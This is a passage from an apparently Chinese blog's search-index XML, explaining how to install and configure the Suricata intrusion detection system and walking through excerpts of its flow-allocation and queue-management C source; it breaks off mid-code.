<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Suricata通过共享内存获取流量+pwn-浏览器内核V8</title>
      <link href="/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/"/>
      <url>/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/</url>
      
        <content type="html"><![CDATA[<h1 id="Suricata通过共享内存获取流量"><a href="#Suricata通过共享内存获取流量" class="headerlink" title="Suricata通过共享内存获取流量"></a>Suricata通过共享内存获取流量</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Suricata是一个高性能的网络入侵检测和防御系统（IDS/IPS）。它是由OISF开发，完全开源，并且可以免费使用。<a href="https://github.com/OISF/suricata">https://github.com/OISF/suricata</a></p><p>Suricata由线程和队列组成，数据包在线程间传递通过队列实现。线程由多个线程模块组成，每个线程模块实现一种功能。</p><p>Suricata有多种运行模式，这些模式与抓包驱动和IDS/IPS选择相关联。抓包驱动如：pcap, pcap file, nfqueue, ipfw, dpdk或者一个特有的抓包驱动等。Suricata在启动时只能选择某个运行模式。如-i选项表示pcap，-r表示pcapfile，-q表示nfqueue等。每一种运行模式都会初始化一些threads, queues等。模式的具体任务是由线程模块来完成。根据线程和线程模块的组织方式的不同，我们可以./suricata –list-runmodes查看运行模式，运行模式又细分为”autofp”, “single”,“wokers”。</p><p>Suricata 针对每种运行模式实现了对应的 ThreadVars 数据结构，从而在线程程度上操作数据。对应的数据结构分别位于对应模式的source文件里面，命名为：模式名字+ThreadVars。</p><p>共享内存(shared memory)指在多处理器的计算机系统中，可以被不同中央处理器（CPU）访问的大容量内存。由于多个CPU需要快速访问存储器，这样就要对存储器进行缓存（Cache）。任何一个缓存的数据被更新后，由于其他处理器也可能要存取，共享内存就需要立即更新，否则不同的处理器可能用到不同的数据。共享内存是 Unix下的多进程之间的通信方法，这种方法通常用于一个程序的多进程间通信，实际上多个程序间也可以通过共享内存来传递信息。</p><h2 id="Suricata安装"><a href="#Suricata安装" class="headerlink" title="Suricata安装"></a>Suricata安装</h2><ol><li><p>添加 Suricata PPA（个人包档案）并安装 Suricata,添加 OISF（Open Information Security Foundation）的 PPA：</p>  <pre class="line-numbers language-none"><code class="language-none">sudo add-apt-repository ppa:oisf&#x2F;suricata-stablesudo apt update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714141047.png"></p></li><li><p>安装 Suricata：</p>  <pre class="line-numbers language-none"><code class="language-none">sudo apt install suricata -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714141152.png"></p></li><li><p>安装完成后，运行以下命令以验证 Suricata 是否正确安装：</p>  <pre class="line-numbers language-none"><code class="language-none">suricata --build-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714141225.png"></p></li></ol><h2 id="Suricata配置"><a href="#Suricata配置" class="headerlink" title="Suricata配置"></a>Suricata配置</h2><ol><li><p>创建配置文件的备份，修改之前一定要先备份</p>  <pre class="line-numbers language-none"><code class="language-none">sudo cp &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  Suricata的可执行文件默认在/usr/bin下，配置文件默认在/etc/suricata下</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714142855.png"></p></li><li><p>可以通过Suricata内置的测试模式检查配置文件和其他规则的有效性</p>  <pre class="line-numbers language-none"><code class="language-none">sudo suricata -T -c &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714143154.png"></p></li><li><p>  在/etc/suricata/suricata.yaml中可以更改要监控的网络接口</p></li></ol><h2 id="运行前的测试"><a href="#运行前的测试" class="headerlink" title="运行前的测试"></a>运行前的测试</h2><ol><li><p>  以下是我笔记本上的各个网络接口</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714143502.png"></p></li><li><p>这里我用wifi0接口测试能否正常运行</p>  <pre class="line-numbers language-none"><code class="language-none">sudo suricata -c &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="Suricata运行模式"><a href="#Suricata运行模式" class="headerlink" title="Suricata运行模式"></a>Suricata运行模式</h2><ol><li>  Suricata有多种运行模式，这些模式与抓包驱动和IDS/IPS选择相关联。抓包驱动如：pcap, pcap file, nfqueue,ipfw, dpdk或者一个特有的抓包驱动等。Suricata在启动时只能选择某个运行模式。如-i选项表示pcap， -r表示pcapfile，-q表示nfqueue等。每一种运行模式都会初始化一些threads,queues等。模式的具体任务是由线程模块来完成。根据线程和线程模块的组织方式的不同，运行模式又细分为”autofp”, “single”,“wokers”.</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714154354.png"></li></ol><h3 id="IDS（入侵检测系统）模式"><a href="#IDS（入侵检测系统）模式" class="headerlink" title="IDS（入侵检测系统）模式"></a>IDS（入侵检测系统）模式</h3><ol><li><p>  <strong>特点</strong>：仅检测不阻止。</p></li><li><p>  <strong>数据获取</strong>：通常使用 Libpcap 或 AF_PACKET 抓包。</p></li><li><p>  <strong>流程</strong>：网络接口 -&gt; 抓包驱动 -&gt; Suricata -&gt; 检测引擎 -&gt; 日志/报警。</p></li><li><p>  <strong>优势</strong>：简单配置，不影响流量。</p></li><li><p>  <strong>劣势</strong>：不能阻止攻击，只能告警。</p></li></ol><h3 id="IPS（入侵防御系统）模式"><a href="#IPS（入侵防御系统）模式" class="headerlink" title="IPS（入侵防御系统）模式"></a>IPS（入侵防御系统）模式</h3><ol><li><p>  <strong>特点</strong>：检测并阻止。</p></li><li><p>  <strong>数据获取</strong>：通常使用 NFQUEUE 或 AF_PACKET 抓包。</p></li><li><p>  <strong>流程</strong>：网络接口 -&gt; 抓包驱动 -&gt; Suricata -&gt; 检测引擎 -&gt; 阻止/通过流量。</p></li><li><p>  <strong>优势</strong>：可以阻止攻击。</p></li><li><p>  <strong>劣势</strong>：配置复杂，可能影响网络性能。</p></li></ol><h3 id="流的分配"><a href="#流的分配" class="headerlink" title="流的分配"></a>流的分配</h3><ol><li><p>当suricata收到一个特定协议（<code>ipv6</code>, <code>icmp</code>, <code>sctp</code>,<code>tcp</code>,<code>udp</code>）的packet后，会计算一个流的hash值，设置<code>PKT_WANTS_FLOW</code>标志。</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowSetupPacket</span><span class="token punctuation">(</span>Packet <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    p<span class="token operator">-></span>flags <span class="token operator">|=</span> PKT_WANTS_FLOW<span class="token punctuation">;</span>    p<span class="token operator">-></span>flow_hash <span class="token operator">=</span> <span class="token function">FlowGetHash</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>FlowWorker</code>会基于<code>PKT_WANTS_FLOW</code>标志，进行流的查找或分配。</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> TmEcode <span class="token function">FlowWorker</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> Packet <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> PacketQueue <span class="token operator">*</span>preq<span class="token punctuation">,</span> PacketQueue <span class="token operator">*</span>unused<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* handle Flow */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>flags <span class="token operator">&amp;</span> PKT_WANTS_FLOW<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">FLOWWORKER_PROFILING_START</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> PROFILE_FLOWWORKER_FLOW<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">FlowHandlePacket</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> fw<span class="token operator">-></span>dtv<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>p<span class="token operator">-></span>flow <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">DEBUG_ASSERT_FLOW_LOCKED</span><span class="token punctuation">(</span>p<span class="token operator">-></span>flow<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FlowUpdate</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> fw<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> TM_ECODE_DONE<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过对流进行哈希检索:查找包含流指针的哈希桶</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowHandlePacket</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> DecodeThreadVars <span class="token operator">*</span>dtv<span class="token punctuation">,</span> Packet <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowGetFlowFromHash</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> dtv<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token operator">-></span>flow<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    p<span class="token operator">-></span>flags <span class="token operator">|=</span> PKT_HAS_FLOW<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Flow <span class="token operator">*</span><span class="token function">FlowGetFlowFromHash</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> DecodeThreadVars <span class="token operator">*</span>dtv<span class="token punctuation">,</span> <span class="token keyword">const</span> Packet <span class="token operator">*</span>p<span class="token punctuation">,</span> Flow <span class="token operator">*</span><span class="token operator">*</span>dest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment">/* get our hash bucket and lock it */</span>    <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> hash <span class="token operator">=</span> p<span class="token operator">-></span>flow_hash<span class="token punctuation">;</span>    FlowBucket <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span>flow_hash<span class="token punctuation">[</span>hash <span class="token operator">%</span> flow_config<span class="token punctuation">.</span>hash_size<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">FBLOCK_LOCK</span><span class="token punctuation">(</span>fb<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果桶内没有任何流，分配一条新的流</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fb<span class="token operator">-></span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      f <span class="token operator">=</span> <span class="token function">FlowGetNew</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> dtv<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">FBLOCK_UNLOCK</span><span class="token punctuation">(</span>fb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>           <span class="token comment">/* flow is locked */</span>      fb<span class="token operator">-></span>head <span class="token operator">=</span> f<span class="token punctuation">;</span>      fb<span class="token operator">-></span>tail <span class="token operator">=</span> f<span class="token punctuation">;</span>           <span class="token comment">/* got one, now lock, initialize and return */</span>      <span class="token function">FlowInit</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>      f<span class="token operator">-></span>flow_hash <span class="token operator">=</span> hash<span class="token punctuation">;</span>      f<span class="token operator">-></span>fb <span class="token operator">=</span> fb<span class="token punctuation">;</span>      <span class="token function">FlowUpdateState</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> FLOW_STATE_NEW<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">FlowReference</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">FBLOCK_UNLOCK</span><span class="token punctuation">(</span>fb<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> f<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将包与找到的流进行比较</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token comment">/* see if this is the flow we are looking for */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FlowCompare</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Flow <span class="token operator">*</span>pf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">/* previous flow */</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FlowCompare</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">return</span> f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="流的队列"><a href="#流的队列" class="headerlink" title="流的队列"></a>流的队列</h3><h4 id="spare队列"><a href="#spare队列" class="headerlink" title="spare队列"></a>spare队列</h4><ol><li><p>spare队列存储着备用的、未使用的、预分配的流。</p>  <pre class="line-numbers language-none"><code class="language-none">FlowQueue flow_spare_q;FlowQueueInit(&amp;flow_spare_q);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h4><p><code>flow_spare_q</code>的入队的操作，主要发生在：</p><ol><li><p>初始化时的预分配</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowInitConfig</span><span class="token punctuation">(</span><span class="token keyword">char</span> quiet<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">/* pre allocate flows */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowAlloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">SCLogError</span><span class="token punctuation">(</span>SC_ERR_FLOW_INIT<span class="token punctuation">,</span> <span class="token string">"preallocating flow failed: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>流管理检查时的补足</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FlowUpdateSpareFlows</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        toalloc <span class="token operator">=</span> flow_config<span class="token punctuation">.</span>prealloc <span class="token operator">-</span> len<span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> toalloc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowAlloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>流的回收，即从<code>flow_recycle_q</code>到<code>flow_spare_q</code></p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> TmEcode <span class="token function">FlowRecycler</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>th_v<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>thread_data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">FLOWLOCK_WRLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">OutputFlowLog</span><span class="token punctuation">(</span>th_v<span class="token punctuation">,</span> ftd<span class="token operator">-></span>output_thread_data<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">FlowClearMemory</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>protomap<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">FlowMoveToSpare</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>                recycled_cnt<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h4><p><code>flow_spare_q</code>的出队的操作，主要发生在：</p><ol><li><p>流的分配</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> Flow <span class="token operator">*</span><span class="token function">FlowGetNew</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> DecodeThreadVars <span class="token operator">*</span>dtv<span class="token punctuation">,</span> <span class="token keyword">const</span> Packet <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">/* get a flow from the spare queue */</span>    f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-c" data-language="c"><code class="language-c">Flow <span class="token operator">*</span><span class="token function">FlowGetFromFlowKey</span><span class="token punctuation">(</span>FlowKey <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">timespec</span> <span class="token operator">*</span>ttime<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> hash<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">/* No existing flow so let's get one new */</span>    f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>释放多余的分配的流</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FlowUpdateSpareFlows</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        tofree <span class="token operator">=</span> len <span class="token operator">-</span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tofree<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* FlowDequeue locks the queue */</span>            Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进程退出</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowShutdown</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">/* free queues */</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">FlowFree</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="recycle队列"><a href="#recycle队列" class="headerlink" title="recycle队列"></a>recycle队列</h3><ol><li><p>recycle队列存储着将传递到清理、日志线程的流。</p>  <pre class="line-numbers language-none"><code class="language-none">FlowQueue flow_recycle_q;FlowQueueInit(&amp;flow_recycle_q);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="入队-1"><a href="#入队-1" class="headerlink" title="入队"></a>入队</h4><p><code>flow_recycle_q</code>的入队的操作，主要发生在:</p><ol><li><p>流超时进行回收</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token class-name">uint32_t</span> <span class="token function">FlowManagerHashRowTimeout</span><span class="token punctuation">(</span>Flow <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token operator">*</span>ts<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token comment">/* no one is referring to this flow, use_cnt 0, removed from hash             * so we can unlock it and pass it to the flow recycler */</span>            <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进程退出时，对流hash桶中的流进行回收处理</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token class-name">uint32_t</span> <span class="token function">FlowManagerHashRowCleanup</span><span class="token punctuation">(</span>Flow <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment">/* no one is referring to this flow, use_cnt 0, removed from hash         * so we can unlock it and move it to the recycle queue. */</span>        <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="出队-1"><a href="#出队-1" class="headerlink" title="出队"></a>出队</h4><p>​    <code>flow_recycle_q</code>的出队的操作，主要发生在：</p><ol><li><p>流的回收，即从<code>flow_recycle_q</code>到<code>flow_spare_q</code></p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> TmEcode <span class="token function">FlowRecycler</span><span class="token punctuation">(</span>ThreadVars <span class="token 